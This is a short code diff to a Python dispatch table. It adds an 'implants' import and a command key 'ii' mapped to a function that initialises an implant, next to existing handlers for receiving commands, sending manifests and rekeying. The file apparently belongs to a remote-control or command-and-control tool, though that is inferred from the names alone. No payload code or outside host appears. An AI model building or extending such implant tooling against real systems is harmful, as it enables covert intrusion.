@@ -1,10 +1,12 @@
 from lib import core
+from lib import implants
 
 destinations = {"lpo": core.send_manifest,
                 "lpmo": core.initialized,
                 "lprk": core.rekey,
                 "rcmd": core.receive_command,
-                "noop": core.noop
+                "noop": core.noop,
+                "ii": implants.initialize_implant
                 }
 
 
